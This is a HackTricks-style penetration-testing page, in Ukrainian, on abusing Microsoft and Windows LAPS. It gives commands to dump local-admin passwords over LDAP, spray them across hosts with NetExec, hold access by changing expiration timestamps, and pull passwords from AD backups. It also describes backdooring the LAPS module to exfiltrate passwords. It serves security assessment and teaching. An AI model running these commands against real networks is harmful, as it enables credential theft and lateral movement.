# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація

Наразі під час assessment можна зустріти **2 варіанти LAPS**:

- **Legacy Microsoft LAPS**: зберігає пароль локального адміністратора в **`ms-Mcs-AdmPwd`**, а час завершення його дії — у **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (вбудований у Windows починаючи з оновлень за квітень 2023 року): усе ще може емулювати legacy mode, але в native mode використовує атрибути **`msLAPS-*`**, підтримує **шифрування паролів**, **історію паролів** і **резервне копіювання пароля DSRM** для контролерів домену.

LAPS призначений для керування **паролями локальних адміністраторів**, роблячи їх **унікальними, випадковими та такими, що часто змінюються** на комп'ютерах, приєднаних до домену. Якщо ви можете читати ці атрибути, зазвичай можна виконати **pivot як локальний адміністратор** до відповідного хоста. У багатьох середовищах важливо не лише прочитати сам пароль, а й визначити, **кому було делеговано доступ** до атрибутів пароля.

### Атрибути Legacy Microsoft LAPS

У об'єктах комп'ютерів домену реалізація Legacy Microsoft LAPS призводить до додавання двох атрибутів:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **пароль адміністратора у відкритому вигляді**
- **`ms-Mcs-AdmPwdExpirationTime`**: **час завершення дії пароля**

### Атрибути Windows LAPS

Native Windows LAPS додає до об'єктів комп'ютерів кілька нових атрибутів:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: blob пароля у відкритому вигляді, що зберігається як JSON, якщо шифрування не ввімкнено
- **`msLAPS-PasswordExpirationTime`**: запланований час завершення дії
- **`msLAPS-EncryptedPassword`**: зашифрований поточний пароль
- **`msLAPS-EncryptedPasswordHistory`**: зашифрована історія паролів
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: зашифровані дані пароля DSRM для контролерів домену
- **`msLAPS-CurrentPasswordVersion`**: відстеження версії на основі GUID, що використовується новішою логікою виявлення відкату (схема лісу Windows Server 2025)

Коли **`msLAPS-Password`** доступний для читання, його значення є JSON-об'єктом, що містить ім'я облікового запису, час оновлення та пароль у відкритому вигляді, наприклад:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Перевірка, чи активовано
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Доступ до паролів LAPS

Ви можете **завантажити необроблену політику LAPS** з `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, а потім використати **`Parse-PolFile`** з пакета [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), щоб перетворити цей файл у зрозумілий для людини формат.

### Legacy Microsoft LAPS PowerShell cmdlets

Якщо встановлено legacy-модуль LAPS, зазвичай доступні такі cmdlets:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Вбудований Windows LAPS постачається з новим PowerShell-модулем і новими cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Кілька операційних деталей мають значення:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** автоматично працює з **legacy LAPS**, **clear-text Windows LAPS** і **encrypted Windows LAPS**.
- Якщо пароль зашифрований і ви можете його **прочитати**, але не можете **розшифрувати**, cmdlet повертає метадані, як-от **`Source`**, **`DecryptionStatus`** і **`AuthorizedDecryptor`**, навіть якщо не може повернути пароль у clear text.
- У **encrypted Windows LAPS** **read permission** і **decrypt permission** є **різними засобами контролю**. Наявність доступу на читання OU / object не означає автоматичної можливості розшифрувати **`msLAPS-EncryptedPassword`**.
- **Історія паролів** доступна лише тоді, коли ввімкнено **Windows LAPS encryption**.
- На domain controllers джерелом у результаті може бути **`EncryptedDSRMPassword`**.

Це корисно під час assessment, оскільки поле **`AuthorizedDecryptor`** показує, для якого **user** або **group** було зашифровано blob, часто перетворюючи невдале читання пароля на нову ціль для privilege escalation.

### PowerView / LDAP

**PowerView** також можна використовувати, щоб визначити, **хто може читати пароль, і прочитати його**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Якщо **`msLAPS-Password`** доступний для читання, розберіть отриманий JSON і отримайте **`p`** для пароля та **`n`** для імені керованого локального облікового запису адміністратора.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Це поле **`n`** має значення в новіших розгортаннях, оскільки **Windows LAPS automatic account management** може використовувати **custom account** замість вбудованого **`Administrator`**, а новіші системи **Windows 11 24H2 / Windows Server 2025** можуть навіть **randomize** ім’я цього облікового запису.<sup>[[4]](#references)</sup>

### Linux / віддалені інструменти

Сучасні інструменти підтримують як legacy Microsoft LAPS, так і Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Нотатки:

- Останні збірки **NetExec** підтримують **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** і **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** досі корисний для **legacy Microsoft LAPS** з Linux, але він працює лише з **`ms-Mcs-AdmPwd`**.
- Новіші кросплатформні інструменти, такі як **`LAPS4LINUX`**, інструменти на основі **`dpapi-ng`** і сучасні workflow у **NetExec**, також можуть працювати з **native Windows LAPS** із non-Windows хостів.
- Якщо в середовищі використовується **encrypted Windows LAPS**, простого LDAP read недостатньо; також потрібно бути **authorized decryptor** (або мати еквівалентні матеріали для розшифрування, наприклад offline domain DPAPI-NG root key material).<sup>[[5]](#references)</sup>
- У **Windows 11 24H2 / Windows Server 2025** не слід припускати, що керований local admin завжди має ім'я **`Administrator`**. Automatic account management може створити custom account і за потреби рандомізувати його ім'я, тому спочатку визначте ім'я облікового запису через **`n`** / **`Account`**, перш ніж використовувати **`--laps`** у масштабі.<sup>[[4]](#references)</sup>

### Зловживання directory synchronization

Якщо у вас є права **directory synchronization** на рівні домену замість прямого read access до кожного computer object, LAPS усе ще може бути цікавим.

Комбінацію **`DS-Replication-Get-Changes`** з **`DS-Replication-Get-Changes-In-Filtered-Set`** або **`DS-Replication-Get-Changes-All`** можна використовувати для синхронізації **confidential / RODC-filtered** атрибутів, таких як legacy **`ms-Mcs-AdmPwd`**. BloodHound моделює це як **`SyncLAPSPassword`**. Перегляньте [DCSync](dcsync.md), щоб дізнатися про background replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) спрощує enumeration LAPS за допомогою кількох функцій.<sup>[[6]](#references)</sup>\
Одна з них — parsing **`ExtendedRights`** для **всіх комп'ютерів із увімкненим LAPS.** Це показує **групи**, яким спеціально **делеговано read LAPS passwords**, і до яких часто входять users у protected groups.\
**Account**, який **приєднав computer** до домену, отримує `All Extended Rights` щодо цього хоста, і це право надає **account** можливість **read passwords**. Enumeration може показати user account, який може read LAPS password на хості. Це може допомогти нам **націлитися на конкретних AD users**, які можуть read LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Отримання паролів LAPS за допомогою NetExec / CrackMapExec

Якщо у вас немає інтерактивного PowerShell, ви можете віддалено використати цю привілею через LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Це зливає всі секрети LAPS, які користувач може читати, що дає змогу здійснювати lateral movement за допомогою іншого пароля локального адміністратора.

## Використання LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Персистентність LAPS

### Дата завершення дії

Отримавши права **admin**, можна **отримати паролі** та **запобігти** **оновленню** **пароля** на машині, **встановивши дату завершення дії на майбутнє**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Вбудований Windows LAPS натомість використовує **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Пароль усе одно буде змінено, якщо **admin** використовує **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, або якщо ввімкнено параметр **Do not allow password expiration time longer than required by policy**.

### Застереження щодо відкату snapshot у новіших версіях Windows LAPS

Старіші методи відкату snapshot / image є **менш надійними** проти сучасних розгортань **Windows LAPS**. У **Windows 11 24H2 / Windows Server 2025**, якщо схема forest містить **`msLAPS-CurrentPasswordVersion`** (**схема forest Windows Server 2025**), клієнт порівнює локально кешований GUID зі значенням, збереженим в AD, і **негайно змінює пароль**, коли відкат створює **torn state**.

На практиці це означає, що persistence на основі snapshot або спроби відновити старий відомий пароль локального admin можуть швидко втратити чинність замість того, щоб зберегтися до наступного звичайного завершення терміну дії.<sup>[[2]](#references)</sup>

Цей захист застосовується лише до **AD-backed Windows LAPS** і все ще залежить від того, чи може відновлена машина **автентифікуватися назад до AD**. Якщо машина більше не може зв’язатися з AD, **історія паролів** або **доступ до резервної копії AD** все ще можуть врятувати ситуацію.

### Застереження щодо втручання в automatic account management

Якщо ввімкнено **automatic account management**, Windows LAPS керує життєвим циклом керованого локального admin-акаунта. Неочікувані спроби перейменувати, переналаштувати або іншим чином змінити цей акаунт можуть бути відхилені з помилкою **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, тому persistence, що залежить від непомітної модифікації керованого LAPS-акаунта, є менш надійною на новіших endpoint.<sup>[[4]](#references)</sup>

### Відновлення історичних паролів із резервних копій AD

Якщо ввімкнено **шифрування Windows LAPS + історію паролів**, підключені резервні копії AD можуть стати додатковим джерелом секретів. Якщо ви маєте доступ до підключеного snapshot AD і використовуєте **recovery mode**, можна запитувати старі збережені паролі без звернення до активного DC.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Це переважно актуально під час **крадіжки резервних копій AD**, **зловживання offline forensics** або **отримання доступу до носіїв disaster recovery**.

### Backdoor

Оригінальний вихідний код legacy Microsoft LAPS можна знайти [тут](https://github.com/GreyCorbel/admpwd), тому в код можна додати backdoor (наприклад, усередині методу `Get-AdmPwdPassword` у `Main/AdmPwd.PS/Main.cs`), який певним чином **exfiltrate нові паролі або зберігатиме їх десь**.

Потім скомпілюйте новий `AdmPwd.PS.dll` і завантажте його на машину в `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (і змініть час модифікації).

## References

- [1] [Вступ до Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Схема Windows LAPS і розширення прав для Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Початок роботи з Windows LAPS і Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Режими керування обліковими записами Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [Внутрішня будова LAPS 2.0 - блог XPN Infosec](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
